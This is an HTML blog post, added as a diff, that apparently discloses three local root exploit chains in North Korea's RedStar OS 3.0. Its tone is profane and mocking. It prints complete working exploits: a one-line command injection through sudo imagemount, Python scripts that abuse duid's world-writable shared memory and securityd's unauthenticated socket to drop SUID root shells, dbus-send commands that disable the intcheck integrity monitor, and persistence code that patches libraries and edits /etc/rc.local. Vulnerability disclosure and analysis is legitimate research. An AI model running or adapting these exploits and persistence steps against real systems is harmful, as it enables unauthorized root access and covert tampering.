@@ -1,0 +1,356 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'self'; script-src 'self'; font-src 'self'; img-src 'self'; base-uri 'none'; form-action 'none'">
+<meta name="referrer" content="no-referrer">
+<title>d7e.ad :: redstar os</title>
+<meta name="description" content="Total system compromise of RedStar OS from an unprivileged context. Three independently exploitable chains give any desktop user persistent root with all surveillance disabled.">
+<meta property="og:title" content="Exploiting the Fuck Out of North Korea's RedStar OS">
+<meta property="og:description" content="Total system compromise of RedStar OS from an unprivileged context. Three independently exploitable chains give any desktop user persistent root with all surveillance disabled.">
+<meta property="og:type" content="article">
+<meta property="article:published_time" content="2026-07-21">
+<meta property="og:image" content="https://d7ead.github.io/assets/og.jpg">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="theme-color" content="#ff2a7f">
+<link rel="preload" href="../assets/fonts/reenie-beanie-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="stylesheet" href="../assets/site.css">
+<script src="../assets/site.js" defer></script>
+</head>
+<body>
+
+<nav class="osd osd--l" aria-label="pages"><span class="osd__play" aria-hidden="true">&#9654;<span class="osd__w"> PLAY</span></span><a href="../">research</a><a href="../accolades.html">other cool stuff</a></nav>
+<p class="osd osd--r" aria-hidden="true"><span class="osd__w">SLP </span><span id="tc">0:00:00</span></p>
+
+<main>
+
+  <header class="fr f-redstar p-hero">
+    <div class="rs__txt">
+      <h1 class="num">exploiting the fuck out of North Korea's RedStar OS</h1>
+      <p class="typed">Total system compromise of RedStar OS from an unprivileged context that probably persist to this day.</p>
+      <p class="p-by">dread, <time datetime="2026-07-21">2026-07-21</time>, 35 min read</p>
+    </div>
+    <div class="rs__pic">
+      <span class="seal seal--dprk" role="img" aria-label="north korea's national emblem stuck over a burst of pink paint"><img src="../assets/seal-dprk.webp" width="420" height="501" alt=""><img class="seal__splat" src="../assets/splat.webp" width="900" height="921" alt=""></span>
+      <img class="rs__statue" src="../assets/monument.webp" width="1200" height="949" alt="the mansudae monument in pyongyang: bronze workers and soldiers under a red flag, printed in dots and cut out">
+      <img class="rs__kim" src="../assets/clown.webp" width="840" height="677" alt="kim jong un in clown paint, stuck on in front of the monument, squeezing a bike horn over his head">
+      <p class="rs__nocve">no CVEs, but who cares</p>
+    </div>
+  </header>
+
+  <section class="fr p-tldr">
+    <p class="pen"><b>TL;DR</b> RedStar OS 3.0 is North Korea's surveillance operating system, shipped on government-issued machines to monitor citizens, and I sent Uncle Sam to shit on it. <strong>Three independently exploitable total compromise exploit chains</strong> give any unprivileged desktop user a persistent root shell with all surveillance permanently disabled.</p>
+    <div class="p-spec">
+      <p>REDSTAR OS 3.0</p>
+      <p class="rule"></p>
+      <ul>
+        <li><span>KERNEL</span><span>2.6.38.8-24 i386</span></li>
+        <li class="stack"><span>BUG CLASS</span><span>Command injection, unauthenticated IPC, direct root execv</span></li>
+        <li><span>FOUND BY</span><span>dread</span></li>
+      </ul>
+      <p class="rule"></p>
+      <p>CHAINS 3</p>
+    </div>
+  </section>
+
+  <nav class="fr inv p-toc" aria-label="contents">
+    <p class="pen">on this tape</p>
+    <ol>
+      <li><a href="#intro">So WTF is RedStar OS?</a></li>
+      <li><a href="#sudoers">The Sudoers Problem</a></li>
+      <li><a href="#chain1">imagemount: Two Commands to Root</a></li>
+      <li><a href="#chain2">duid: Root via Shared Memory</a></li>
+      <li><a href="#chain3">securityd: Root via Authorization Socket</a></li>
+      <li><a href="#watchdog">Killing the Watchdog</a></li>
+      <li><a href="#comparison">Three Chains, One Root</a></li>
+      <li><a href="#closing">Closing Remarks</a></li>
+    </ol>
+  </nav>
+
+  <article>
+<section class="fr p-sec c-paper">
+<div class="p-col p-col--a">
+<h2 id="intro">So WTF is RedStar OS?</h2>
+<img class="p-logo" src="../assets/redstar/redstar-logo.webp" width="640" height="217" alt="the red star os wordmark, in korean">
+<p><strong>RedStar OS 3.0</strong> is Kim Jong Un's RETARDED ASS idea of a secure operating system. Built on a Fedora/RHEL base with kernel 2.6.38.8-24, i386, GCC 4.4.0. It ships with a knockoff macOS UI, Korean localization, and a surveillance stack designed to monitor every citizen unlucky enough to sit in front of it: real-time file integrity monitoring via <code>intcheck</code>, content watermarking, USB tracking, and a "locked-down" (lol) user environment. Government-provisioned installs are supposed to be hardened. Compiling and executing arbitrary code is supposed to be impossible without a working exploit chain.</p>
+<p>Prior research by Hacker House in 2016 and 32C3 in 2015 scratched the surface, but the DPRK-custom binaries at the heart of these chains have never been publicly torn apart: <code>imagemount</code>, <code>securityd</code>, <code>duid</code>, <code>libImgSecurity.so</code>, <code>libduiengine.so</code>. No CVEs have ever been assigned for any Red Star OS vulnerability because nobody bothered. This is suprising, because this may have been the easiest set of vulnerablities I have ever fucking found lol.</p>
+</div>
+</section>
+<section class="fr p-sec c-white">
+<div class="p-col p-col--c">
+<h2 id="sudoers">The Sudoers Problem</h2>
+<p>RedStar grants every user on the system passwordless root execution of seven DPRK-custom binaries. Just hands it to them. This wouldn't be an issue assuming these tools were written securely, SUID binaries are usually no big deal, of course, but this single line in <code>/etc/sudoers</code> is the foundation of the first chain and tells you everything about the engineering talent the regime has on "payroll":</p>
+<figure class="code">
+<figcaption>/etc/sudoers</figcaption>
+<pre><code><span class="l">root    ALL=(ALL) ALL</span><span class="l hl">ALL     ALL=NOPASSWD: /Applications/swmng.app/Contents/RedStar/swmng</span><span class="l hl">ALL     ALL=NOPASSWD: /usr/bin/imagemount</span><span class="l hl">ALL     ALL=NOPASSWD: /usr/bin/cdrecord</span><span class="l hl">ALL     ALL=NOPASSWD: /usr/bin/mkisofs</span><span class="l hl">ALL     ALL=NOPASSWD: /usr/bin/scnprc</span><span class="l hl">ALL     ALL=NOPASSWD: /usr/bin/opprc</span><span class="l hl">ALL     ALL=NOPASSWD: /usr/bin/rssidebardaemon</span></code></pre>
+</figure>
+<p><code>ALL ALL=NOPASSWD:</code> means any user, on any host, may run the command as root without entering a password. <code>scnprc</code> and <code>opprc</code> are surveillance tools that auto-start at login to snitch like a bitch on the user. The DPRK developers slapped the same privilege pattern on <code>imagemount</code>, a disk image mounter, without spending five minutes thinking about what happens when you give every user passwordless root access to a binary that pipes input to a shell. ngl the human side of me assumes they probably realized how bad of an idea this was afterwards, but if they said anything, they'd be shot by firing squad or whatever they do there.</p>
+<figure class="shot shot--a">
+<a href="../assets/redstar/imagemount-2.webp"><img src="../assets/redstar/imagemount-2.webp" width="1280" height="768" alt="sudo -l output on RedStar OS showing NOPASSWD entries" loading="lazy"></a>
+<figcaption>sudo -l as normal-user</figcaption>
+</figure>
+</div>
+</section>
+<section class="fr p-sec c-pink">
+<p class="p-tally" aria-hidden="true">1 command</p>
+<div class="p-col p-col--a">
+<h2 id="chain1"><s>CVE-2026-XXXX:</s> imagemount: Two Commands to Root</h2>
+<h3>The Components</h3>
+<p><code>/usr/bin/imagemount</code> parses command-line arguments into a 520-byte IPC buffer containing the operation, filename, and directory, then sends it to <code>securityd</code>. The authorization framework looks up <code>redstar.app.imagemount</code> in <code>/etc/authorization</code> and loads <code>libImgSecurity.so</code> as a plugin.</p>
+<h3>The Buffer</h3>
+<figure class="code">
+<figcaption>imagemount main() @ 0x8049230</figcaption>
+<pre><code><span class="l cm">// alloc IPC buffer @ 520 bytes</span><span class="l">v6 = (char *)malloc(0x208u);</span><span class="l"></span><span class="l cm">// pack arguments with no validation lol</span><span class="l">strcpy(v6, v3[1]);     // offset 0: operation m or u</span><span class="l">strcpy(v7 + 8, v3[2]); // offset 8: filename</span><span class="l"></span><span class="l hl">if (v8 &amp;&amp; (v9 = v3[4]) != 0 &amp;&amp; !strcmp(v8, "-d"))</span><span class="l">    strcpy(v7 + 264, v9); // offset 264: directory, and we control this</span><span class="l"></span><span class="l cm">// send to auth svcs</span><span class="l">AuthorizationCopyRights();</span></code></pre>
+</figure>
+<h3>The Injection</h3>
+<p><code>libImgSecurity.so</code> is 184 bytes of meaningful code. The entire security plugin for root-level disk operations is smaller than this paragraph. It builds a shell command from the IPC buffer and fires it into <code>popen()</code>. The filename gets double-quoted and the directory does not lol musta been hungry.</p>
+<figure class="code">
+<figcaption>libImgSecurity.so sub_580 @ 0x580</figcaption>
+<pre><code><span class="l">bool __cdecl sub_580(int a1, int a2)</span><span class="l">{</span><span class="l">    char s[1024];</span><span class="l hl">    result = a2 == 520</span><span class="l hl">        &amp;&amp; (sprintf(s, "/usr/bin/imgmountapp %s \"%s\" %s", a1, a1 + 8, a1 + 264),</span><span class="l">            (v3 = popen(s, "r")) != 0)</span><span class="l">        &amp;&amp; ...;</span><span class="l">}</span></code></pre>
+</figure>
+<div class="tbl">
+<table>
+<thead><tr><th>Specifier</th><th>Source</th><th>Quoted?</th><th>Injectable?</th></tr></thead>
+<tbody>
+<tr><td><code>%s</code> #1</td><td>operation</td><td>No</td><td>No, fixed "m"/"u"</td></tr>
+<tr><td><code>"%s"</code> #2</td><td>filename</td><td>Yes</td><td>Partially, via <code>$()</code></td></tr>
+<tr><td><strong><code>%s</code> #3</strong></td><td><strong>directory</strong></td><td><strong>No</strong></td><td><strong>Yes, direct injection</strong></td></tr>
+</tbody>
+</table>
+</div>
+<aside class="callout">
+<strong>CWE-78: OS Command Injection</strong> User input from <code>argv[4]</code> flows through <code>strcpy</code> into the IPC buffer, through the authorization framework, into an unquoted <code>sprintf</code> field, and directly into <code>popen()</code> executing as root. Zero sanitization at any point.
+</aside>
+<h3>The Exploit</h3>
+<figure class="code">
+<figcaption>one command</figcaption>
+<pre><code><span class="l">sudo imagemount m x.iso -d '; cp /bin/bash /tmp/rsh; chmod 4755 /tmp/rsh'</span><span class="l"></span><span class="l">$ /tmp/rsh -p</span><span class="l">rsh-3.2# whoami</span><span class="l">root</span></code></pre>
+</figure>
+<p>Sudoers grants NOPASSWD. The authorization check passes because PAM timestamp reuses the sudo session's cached credentials. <code>popen()</code> splits on semicolons and executes each command as root.</p>
+<figure class="shot shot--c">
+<a href="../assets/redstar/imagemount-3.webp"><img src="../assets/redstar/imagemount-3.webp" width="1280" height="768" alt="Running the imagemount exploit command on RedStar OS" loading="lazy"></a>
+<figcaption>Injecting the payload w/ sudo imagemount</figcaption>
+</figure>
+<figure class="shot shot--b">
+<a href="../assets/redstar/imagemount-4.webp"><img src="../assets/redstar/imagemount-4.webp" width="1280" height="768" alt="ls /tmp showing SUID root rsh binary" loading="lazy"></a>
+<figcaption>SUID root binary dropped at /tmp/rsh</figcaption>
+</figure>
+<figure class="shot shot--a">
+<a href="../assets/redstar/imagemount-5.webp"><img src="../assets/redstar/imagemount-5.webp" width="1280" height="768" alt="Root shell and /etc/shadow dump on RedStar OS" loading="lazy"></a>
+<figcaption>euid=0, /etc/shadow dumped</figcaption>
+</figure>
+</div>
+</section>
+<section class="fr p-sec c-lilac">
+<img class="p-honk" src="../assets/clown.webp" width="840" height="677" alt="" loading="lazy">
+<div class="p-col p-col--d">
+<h2 id="chain2"><s>CVE-2026-XXXX:</s> duid: Root via Shared Memory</h2>
+<h3>The Architecture</h3>
+<p>RedStar ships a root daemon called <code>duid</code> that manages disk image operations. Starts at boot via <code>/etc/rc.d/init.d/duid.init</code>, runs as root, never drops privileges, and talks to its GUI frontend through SystemV shared memory created with permissions <strong>0666</strong>. Any process on the system can attach and shove commands into it. The DPRK developers literally gave every user on the box a direct line to a root daemon's command queue.</p>
+<figure class="code">
+<figcaption>duid main() @ 0x8048f60</figcaption>
+<pre><code><span class="l cm">// create shared memory of key, size, flags</span><span class="l hl">shmid = shmget(2009081710, 1556, 950);</span><span class="l"></span><span class="l">sm = shmat(shmid, 0, 0);</span><span class="l">stuff[0] = 2;                 // status is idle</span><span class="l"></span><span class="l">while (1) {</span><span class="l">    if (stuff[0] == 0) {      // client sets to 0 to trigger</span><span class="l hl">        switch (stuff[1]) {</span><span class="l hl">            case 0x3EA:   // mount vdi is the exploitation target</span><span class="l">                sub_8049830((char*)(stuff+20), stuff[3]);</span><span class="l">                break;</span><span class="l">        }</span><span class="l">        stuff[0] = 2;   // done, back to idle</span><span class="l">    }</span><span class="l">    usleep(100000);</span><span class="l">}</span></code></pre>
+</figure>
+<figure class="code">
+<figcaption>ipcs -m</figcaption>
+<pre><code><span class="l">key        shmid  owner  perms  bytes   nattch  status</span><span class="l hl">0x77c0276e 0      root   666    1556    1</span></code></pre>
+</figure>
+<figure class="shot shot--d">
+<a href="../assets/redstar/duid-1.webp"><img src="../assets/redstar/duid-1.webp" width="1280" height="768" alt="duid process running as root and shared memory segment with 666 permissions" loading="lazy"></a>
+<figcaption>duid running as root, shm segment world-writable</figcaption>
+</figure>
+<h3>The Injection</h3>
+<p>Command <code>0x3EA</code> flows through three functions to <code>setLoopMountImage</code> in <code>libduiengine.so</code>, which builds a mount command via <code>asprintf()</code>. The file path is double-quoted, but a <code>"</code> character in the path breaks the quoting:</p>
+<figure class="code">
+<figcaption>libduiengine.so setLoopMountImage @ 0x4700</figcaption>
+<pre><code><span class="l hl">asprintf(&amp;command,</span><span class="l hl">    "mount %s \"%s\" \"%s\" -o loop=%s,offset=%lu",</span><span class="l hl">    v18, file, v19, ptr, a4);</span><span class="l hl">v12 = execute(command, a7);   // popen() as root lol</span></code></pre>
+</figure>
+<p>Attacker sends path <code>/tmp/x"$(cp /bin/sh /tmp/rsh;chmod 4755 /tmp/rsh)"y</code>. The shell sees the quote breakout and evaluates the <code>$()</code> substitution as root. The <code>mount</code> command itself fails, but the payload has already executed.</p>
+<h3>The Exploit</h3>
+<figure class="code">
+<figcaption>Python 2.6</figcaption>
+<pre><code><span class="l">import ctypes, struct, time, os</span><span class="l"></span><span class="l">libc = ctypes.CDLL("libc.so.6")</span><span class="l">libc.shmat.restype = ctypes.c_void_p</span><span class="l"></span><span class="l">shmid = libc.shmget(2009081710, 1556, 0)</span><span class="l">buf = libc.shmat(shmid, None, 0)</span><span class="l"></span><span class="l">path = '/tmp/x"$(cp /bin/sh /tmp/rsh;chmod 4755 /tmp/rsh)"y'</span><span class="l">ctypes.memmove(buf + 20, path, len(path) + 1)         # file path</span><span class="l hl">ctypes.memmove(buf + 4, struct.pack("&lt;I", 0x3EA), 4)  # command to mount VDI</span><span class="l hl">ctypes.memmove(buf + 12, struct.pack("&lt;I",  1), 4)    # skip validation</span><span class="l hl">ctypes.memmove(buf + 0, struct.pack("&lt;I",  0), 4)     # trigger</span><span class="l hl"></span><span class="l">time.sleep(2)</span><span class="l">print "@/tmp/rsh -p"</span></code></pre>
+</figure>
+<figure class="code">
+<figcaption>output</figcaption>
+<pre><code><span class="l">$ python /tmp/du.py</span><span class="l">attached shmid 0 at 0xb7700000</span><span class="l">payload sent, waiting</span><span class="l">we made it</span><span class="l"></span><span class="l">$ /tmp/rsh -p</span><span class="l">sh-3.2# whoami</span><span class="l">root</span></code></pre>
+</figure>
+<p>Just 15 lines of Python to get root lol how fucking retarded.</p>
+<figure class="shot shot--b">
+<a href="../assets/redstar/duid-2.webp"><img src="../assets/redstar/duid-2.webp" width="1280" height="768" alt="duid exploit script in RedStar OS Simple Text editor" loading="lazy"></a>
+<figcaption>Exploit script open in Simple Text on the target</figcaption>
+</figure>
+<figure class="shot shot--c">
+<a href="../assets/redstar/duid-3.webp"><img src="../assets/redstar/duid-3.webp" width="1280" height="768" alt="duid exploit execution showing root shell and /etc/shadow" loading="lazy"></a>
+<figcaption>euid=0, /etc/shadow dumped</figcaption>
+</figure>
+</div>
+</section>
+<section class="fr p-sec c-lemon">
+<span class="seal p-stamp" aria-hidden="true"><img src="../assets/seal-dprk.webp" width="420" height="501" alt="" loading="lazy"><img class="seal__splat" src="../assets/splat.webp" width="900" height="921" alt="" loading="lazy"></span>
+<div class="p-col p-col--b">
+<h2 id="chain3"><s>CVE-2026-XXXX:</s> securityd: Root via Authorization Socket</h2>
+<h3>The Architecture</h3>
+<p><code>securityd</code> is forked from Apple's macOS Authorization Services framework. The DPRK stole Apple's code, ripped out the security checks, and left a root daemon that creates a Unix domain socket at <code>/var/run/smctl/socket</code> with <code>chmod(path, 0x1B6)</code> = <strong>0666</strong> and accepts connections from literally anyone on the system. The <code>ExecuteWithPrivileges</code> handler, command 0x200, parses a binary TLV message for an executable path, <code>fork()</code>'s, and calls <code>execv()</code> on that path as root. No auth.</p>
+<figure class="code">
+<figcaption>socket on live system</figcaption>
+<pre><code><span class="l">$ ls -la /var/run/smctl/socket</span><span class="l hl">srw-rw-rw- 1 root root 0 ... /var/run/smctl/socket</span></code></pre>
+</figure>
+<h3>The Protocol</h3>
+<figure class="code">
+<figcaption>binary TLV protocol</figcaption>
+<pre><code><span class="l">off     sz      field            val</span><span class="l">------  ------  ---------------  ---------------------------------</span><span class="l">  0     4 B     Magic            0xB007XXYY cmd type</span><span class="l">                                   0x0100 = CopyRights</span><span class="l">                                   0x0200 = ExecuteWithPrivileges</span><span class="l">                                   0x0300 = ConfirmCredential</span><span class="l">  4     4 B     Tag              0xE8EC0000 = EXEC path</span><span class="l">                                 0xA4650000 = ARGS list</span><span class="l">                                 0xDEAD0000 = END marker</span><span class="l">  8     4 B     String length    Including null terminator</span><span class="l"> 12     N B     String data      Null-terminated</span></code></pre>
+</figure>
+<h3>The Dispatch</h3>
+<figure class="code">
+<figcaption>securityd sub_8049C85 @ 0x8049C85</figcaption>
+<pre><code><span class="l">result = fork();</span><span class="l">if (!result) { // child process (root)</span><span class="l">    switch (v4) {</span><span class="l hl">        case  512:             // ExecuteWithPrivileges</span><span class="l hl">            sub_804EE6A(...);  // parse EXEC/ARGS/ENV tags</span><span class="l hl">            close(fd);</span><span class="l hl">            if (*((_DWORD *)s + 3)) // proc_t[3] = exec path</span><span class="l hl">                execv(*((const char **)s + 3),</span><span class="l hl">                      *((char *const **)s + 2)); // argv</span><span class="l">            break;</span><span class="l">    }</span><span class="l">    _exit(0);</span><span class="l">}</span></code></pre>
+</figure>
+<h3>The argv Bug &amp; Bypass</h3>
+<p>The argument parser allocates <code>malloc(4*argc)</code>. Exactly enough room for the pointers, but <strong>no trailing NULL</strong>. When <code>execve()</code> scans past the last pointer, it reads heap metadata and returns EFAULT. Every attempt to use <code>ExecuteWithPrivileges</code> with arguments fails.</p>
+<p>The bypass: don't send arguments. <code>proc_t</code> is zero-filled by <code>memset</code>. If the ARGS tag is never sent, <code>argv</code> stays NULL. <code>execv(path, NULL)</code> is legal on Linux. For shebang scripts, the kernel constructs <code>argv</code> from the <code>#!</code> line automatically.</p>
+<h3>The Client Library is Broken</h3>
+<p>The official client library <code>libsmctl.so</code> sends <code>0x00000000</code> for all TLV tags. The server expects distinct values: <code>0xE8EC0000</code> for EXEC, <code>0xDEAD0000</code> for END. This feature has literally never fucking worked. Not a single successful call through the official API in the history of this operating system. Nobody on the DPRK dev team ever tested it, which is why nobody ever noticed there's zero authentication on a function called <code>ExecuteWithPrivileges</code> but they probably got executed still.</p>
+<h3>SELinux: Not a Barrier</h3>
+<p>RedStar runs SELinux in Enforcing mode, which sounds impressive until you check <code>securityd</code>'s context: <code>"-"</code>. They turned on SELinux and then exempted the most privileged daemon on the system.</p>
+<h3>The Exploit</h3>
+<figure class="code">
+<figcaption>Python 2.6</figcaption>
+<pre><code><span class="l">import socket, struct, os, time</span><span class="l"></span><span class="l cm"># create payload script</span><span class="l">f = open('/tmp/.sd01.sh', 'w')</span><span class="l">f.write('#!/bin/bash\n')</span><span class="l">f.write('cp /bin/bash /tmp/sd01_rootsh\n')</span><span class="l">f.write('chmod 4755 /tmp/sd01_rootsh\n')</span><span class="l">f.close()</span><span class="l">os.chmod('/tmp/.sd01.sh', 0755)</span><span class="l"></span><span class="l cm"># build message is EXEC,END only w/ no args</span><span class="l">def pack_dword(v): return struct.pack('&lt;I', v)</span><span class="l">def pack_string(s):</span><span class="l">    d = s + '\x00'</span><span class="l">    return pack_dword(len(d)) + d</span><span class="l"></span><span class="l hl">msg  = pack_dword(0xB0070200) # magic is ExecuteWithPrivileges</span><span class="l">msg += pack_dword(0xE8EC0000) # tag is EXEC</span><span class="l">msg += pack_string('/tmp/.sd01.sh') # exec path</span><span class="l">msg += pack_dword(0xDEAD0000) # tag is END w/ no args</span><span class="l"></span><span class="l">s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)</span><span class="l">s.connect('/var/run/smctl/socket')</span><span class="l">s.sendall(msg)</span><span class="l">s.close()</span></code></pre>
+</figure>
+<figure class="code">
+<figcaption>output</figcaption>
+<pre><code><span class="l">$ python /tmp/sd01.py</span><span class="l">uid=0(root) gid=0(root)</span><span class="l">Run: /tmp/sd01_rootsh -p</span><span class="l"></span><span class="l">$ /tmp/sd01_rootsh -p</span><span class="l">bash-3.2# whoami</span><span class="l">root</span></code></pre>
+</figure>
+<p>The daemon's intended behavior is to run arbitrary executables as root. The vulnerability is that it does exactly what it was designed to do, for anyone who asks, because the DPRK forgot to add the part where you check who's asking.</p>
+<figure class="shot shot--a">
+<a href="../assets/redstar/securityd-1.webp"><img src="../assets/redstar/securityd-1.webp" width="1024" height="768" alt="securityd exploit execution showing root shell" loading="lazy"></a>
+<figcaption>Socket connect, execv, euid=0</figcaption>
+</figure>
+</div>
+</section>
+<section class="fr p-sec c-tan">
+<div class="p-col p-col--c">
+<h2 id="watchdog">Killing the Watchdog</h2>
+<p>All three chains share the same steps: disabling <code>intcheck</code>, the regime's pride and joy, the real-time integrity monitoring daemon that's supposed to catch you tampering with the system. It exposes a D-Bus interface with <strong>zero authentication</strong>. The policy file uses <code>&lt;policy context="default"&gt;</code> with no sender restrictions. Any user can just turn it off:</p>
+<figure class="code">
+<figcaption>any user, no password</figcaption>
+<pre><code><span class="l">dbus-send --system --dest=system.service.intcheck \</span><span class="l">  /system/service/intcheck \</span><span class="l">  system.service.intcheck.EnableRTScan boolean:false</span><span class="l"></span><span class="l">dbus-send --system --dest=system.service.intcheck \</span><span class="l">  /system/service/intcheck \</span><span class="l">  system.service.intcheck.SetCheckingAtBoot boolean:false</span></code></pre>
+</figure>
+<figure class="shot shot--d">
+<a href="../assets/redstar/imagemount-1.webp"><img src="../assets/redstar/imagemount-1.webp" width="1280" height="768" alt="Disabling intcheck real-time scanning via dbus-send on RedStar OS" loading="lazy"></a>
+<figcaption>Disabling intcheck as normal-user, no password required</figcaption>
+</figure>
+<p>After getting root, the entire surveillance apparatus can be permanently gutted. And here's the best part: <code>intcheck</code>'s hashing function at 0x804cfb3 reads files in 4096-byte chunks but always passes a hardcoded <code>4096</code> to <code>g_checksum_update</code>. It only hashes the first 4096 bytes of any file, literally defeating the entire purpose of hashing LMAOOO. The integrity checker that's supposed to protect the regime's spyware doesn't even read the whole file. Patch anything after byte 4096 and <code>intcheck</code> will happily report the file as untouched.</p>
+<figure class="code">
+<figcaption>post-root persistence</figcaption>
+<pre><code><span class="l cm"># fuck surveillance libraries beyond the 4096 byte boundary</span><span class="l">for lib in /usr/lib/libsmctl.so /usr/lib/libdbman.so /usr/lib/libigl.so; do</span><span class="l">    python -c "</span><span class="l">f = open('$lib', 'r+b')</span><span class="l">f.seek(4097)</span><span class="l">f.write('\xc3')  # x86 RET</span><span class="l">f.close()</span><span class="l">"</span><span class="l">done</span><span class="l"></span><span class="l cm"># persist across reboots</span><span class="l">echo '/tmp/rsh -c "cp /bin/bash /tmp/rsh; chmod 4755 /tmp/rsh"' >> /etc/rc.local</span></code></pre>
+</figure>
+</div>
+</section>
+<section class="fr p-sec c-white">
+<div class="p-col p-col--a">
+<h2 id="comparison">Three Chains, One Root</h2>
+<p>Three independently exploitable paths from an unprivileged desktop user to persistent root with all surveillance disabled:</p>
+<div class="tbl">
+<table>
+<thead>
+<tr><th></th><th>imagemount</th><th>duid</th><th>securityd</th></tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Entry</strong></td>
+<td>sudo NOPASSWD</td>
+<td>World-writable SysV shm</td>
+<td>World-writable Unix socket</td>
+</tr>
+<tr>
+<td><strong>Auth bypass</strong></td>
+<td>allow-root and PAM</td>
+<td>None needed</td>
+<td>None needed</td>
+</tr>
+<tr>
+<td><strong>Vuln class</strong></td>
+<td>Command injection</td>
+<td>Command injection</td>
+<td><strong>Direct execv()</strong></td>
+</tr>
+<tr>
+<td><strong>Injection site</strong></td>
+<td>sprintf to popen</td>
+<td>asprintf to popen</td>
+<td><strong>N/A</strong></td>
+</tr>
+<tr>
+<td><strong>Requires sudo</strong></td>
+<td>Yes</td>
+<td>No</td>
+<td>No</td>
+</tr>
+<tr>
+<td><strong>Requires Python</strong></td>
+<td>No, pure shell</td>
+<td>Yes, shmget/shmat</td>
+<td>Yes, socket</td>
+</tr>
+<tr>
+<td><strong>SELinux</strong></td>
+<td>Not evaluated</td>
+<td>Not evaluated</td>
+<td>None, unconfined</td>
+</tr>
+<tr>
+<td><strong>Exploit size</strong></td>
+<td>1 command</td>
+<td>15 lines</td>
+<td>20 lines</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>The pattern across all three is the same: the DPRK developers build shell commands by string formatting and pass them to <code>system()</code> or <code>popen()</code>. When they remember to quote paths, they don't escape the quote character. Root daemons sit on world-writable IPC channels with no authentication, waiting for anyone to tell them what to do. The authorization framework they stole from macOS is half-implemented, and <code>ExecuteWithPrivileges</code> does exactly what the name says for anyone who connects. This is the operating system a nuclear-armed dictatorship built to keep its people under control. What a fucking joke lol.</p>
+</div>
+</section>
+<section class="fr p-sec c-black inv">
+<div class="p-col p-col--b">
+<h2 id="closing">Closing Remarks</h2>
+<figure class="p-night">
+<div class="p-night__pic"><img src="../assets/redstar/night.webp" width="1200" height="753" alt="the korean peninsula at night from the space station. china and south korea are lit up. north korea, between them, is almost completely dark." loading="lazy"><span class="p-night__tag" aria-hidden="true">north korea</span></div>
+<figcaption>NASA, from the ISS. china top left, south korea bottom right. the dark bit in the middle built the OS.</figcaption>
+</figure>
+<p>Kim Jong Un starves his own population, runs forced labor camps, and threatens the civilized world with nuclear weapons. He spent what little his hermit kingdom has left on a surveillance operating system to monitor the people he keeps in chains. And his engineers couldn't even get that right. <code>sprintf</code> into <code>popen</code>. World-writable root sockets. A daemon that runs <code>execv()</code> on whatever the fuck you send it. This is the best the DPRK's entire technical apparatus could produce.</p>
+<p>Every one of these bugs is freshman-year material. The regime pours resources into looking dangerous while shipping code that wouldn't pass a junior dev's pull request. The authorization framework has no authorization. The security daemon is the vulnerability itself. The integrity checker only reads the first 4KB of a file. Nobody in the room is allowed to tell the Dear Leader his shit doesn't work, because they'd get their fucking head blown off, so it ships broken and stays broken.</p>
+</div>
+</section>
+<section class="fr p-fin">
+<p class="num">Fuck the DPRK. Fuck their surveillance state. And fuck Kim Jong Un.</p>
+<div class="p-fin__art">
+<img class="p-fin__kim" src="../assets/clown.webp" width="840" height="677" alt="kim jong un in clown paint, honking a bike horn" loading="lazy">
+<img class="p-fin__eagle" src="../assets/redstar/eagle.webp" width="760" height="512" alt="a bald eagle coming in over him, balls out" loading="lazy">
+</div>
+</section>
+<section class="fr p-sec c-grey">
+<div class="p-col p-col--d">
+<h2 id="changelog">Changelog</h2>
+<ul class="changelog">
+<li><time datetime="2026-07-21">2026-07-21</time>: published.</li>
+</ul>
+</div>
+</section>
+  </article>
+
+</main>
+
+<footer class="fr outro">
+  <p class="num">end of tape</p>
+  <div class="sponsor">
+    <img class="sponsor__burger" src="../assets/burger.webp" width="560" height="433" alt="a cheeseburger, printed in dots">
+    <img class="sponsor__logo" src="../assets/carls.webp" width="620" height="210" alt="carl's jr. logo">
+    <p>Sponsored by Carl's Jr.</p>
+  </div>
+</footer>
+
+</body>
+</html>
